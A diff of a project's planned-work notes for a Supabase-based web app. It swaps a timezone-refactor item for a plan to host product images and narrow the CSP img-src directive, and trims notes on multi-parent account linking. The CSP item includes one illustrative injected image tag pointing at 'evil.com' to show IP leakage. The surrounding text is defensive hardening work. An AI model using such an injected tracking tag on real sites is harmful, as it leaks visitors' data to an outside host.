@@ -28,18 +28,16 @@ Test cases to add:
 
 **Why:** RLS policies and role-based routing are complex enough that testing against a real DB catches integration bugs that mocked tests miss. Local Supabase keeps tests fast, deterministic, and free from network flakiness — and Docker is available by default in GitHub Actions runners.
 
-### Replace Intl.DateTimeFormat Timezone Hacking with `date-fns-tz`
+### Host Product Images and Tighten CSP `img-src`
 
-Internal timezone math uses `Intl.DateTimeFormat("en-US", { timeZone })` + `formatToParts` as a workaround to convert between timezones — formatting a date to a locale string, then parsing the numbers back out. This works but is fragile and confusing. The `"en-US"` locale is pinned solely to guarantee Arabic numerals. The shared `wallClockToUtc()` in `utils.ts` consolidates this logic (used by both `formatScheduleLocal()` and `enrollment.ts`).
+Product images are currently arbitrary URLs provided by admins. The CSP `img-src` directive must allow `https:` (any HTTPS source) to accommodate this, which means an attacker who achieves HTML injection could load `<img src="https://evil.com/track?...">` to ping an external server and leak the visitor's IP.
 
-`date-fns-tz` provides clean APIs (`fromZonedTime`, `toZonedTime`) that do timezone conversion directly without the format-then-parse roundtrip. This would:
-- Replace `wallClockToUtc()` with a one-liner
-- Eliminate `getWallClockPart()` and `getWallClockDayOfWeek()` helpers in `enrollment.ts` entirely
-- Remove all internal `"en-US"` usages, leaving only browser-locale display formatting
+- [ ] Add image upload to product creation (Supabase Storage or an image CDN like Cloudinary)
+- [ ] Migrate existing product image URLs to hosted images
+- [ ] Tighten CSP `img-src` from `'self' data: blob: https:` to `'self' data: blob: https://your-cdn-domain.com` in `src/proxy.ts`
 
-**Affected files:** `src/lib/utils.ts` (wallClockToUtc), `src/lib/enrollment.ts` (getWallClockPart, getWallClockDayOfWeek)
+**Why:** The current `https:` wildcard is low risk (admins are trusted, and `<img>` tags can't read cookies or page content), but tightening it to a specific domain closes the exfiltration-via-image-ping vector entirely. This is the last meaningful CSP gap after the nonce-based `script-src` fix.
 
-**Why:** Cleaner code, less surface area for bugs (like the `"HH:MM:SS"` parsing issue), and a standard approach used across the industry. The current code works correctly but is unnecessarily complex.
 
 ### Parent-Managed Gamer Profile Fields (DOB, Gender)
 
@@ -47,12 +45,8 @@ Customers (parents) will set `date_of_birth` and `gender` on their linked gamers
 
 ### Multi-Parent Gamer Linking
 
-The IDOR fix (Security Report Finding #2) removed client-side INSERT access to `parent_gamer`. Currently the only way to link a parent to a gamer is when the parent creates the gamer via `POST /api/gamers/create`.
-
-To support a second parent linking to an existing gamer:
+Currently the only way to link a parent to a gamer is when the parent creates the gamer via `POST /api/gamers/create`. To support a second parent linking to an existing gamer:
 
 - [ ] Choose an authorization mechanism (invite code, existing parent approval, or admin-only)
 - [ ] Create a server-side API route (e.g., `POST /api/gamers/link`) that validates authorization before inserting into `parent_gamer` using the admin client
 - [ ] Add UI for the chosen flow (e.g., "Share invite code" button for existing parent, "Enter code" form for second parent)
-
-**Why:** The previous client-side INSERT policy only checked `parent_id = auth.uid()`, allowing any customer to link to any gamer. The fix correctly removed this, but a secure server-side path is needed if multiple parents per gamer is a requirement.
